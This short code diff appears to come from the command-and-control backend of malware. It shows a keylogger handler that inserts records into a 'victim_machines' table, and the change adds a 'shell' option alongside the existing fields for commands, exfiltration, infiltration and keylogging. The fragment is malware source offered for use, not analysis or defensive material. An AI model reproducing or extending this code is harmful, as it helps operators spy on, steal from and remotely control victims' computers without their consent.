@@ -64,7 +64,7 @@ def keylogger( id, keylog_value ):
 			print("creating new entry in database...")
 			empty_json = "e30="
 			default_group_id = 1
-			formatted_command = "{\"commands\": {}, \"exfiltrate\": {}, \"infiltrate\": {}, \"keylogger\": " + value + "}"
+			formatted_command = "{\"commands\": {}, \"exfiltrate\": {}, \"infiltrate\": {}, \"keylogger\": " + value + ", \"shell\": 0}"
 			formatted_encoded = encode(formatted_command)
 
 			create_query = """ INSERT INTO victim_machines (victim_id, group_id, command, command_output, command_record, file_names) VALUES (%s, %s, %s, %s, %s, %s) """
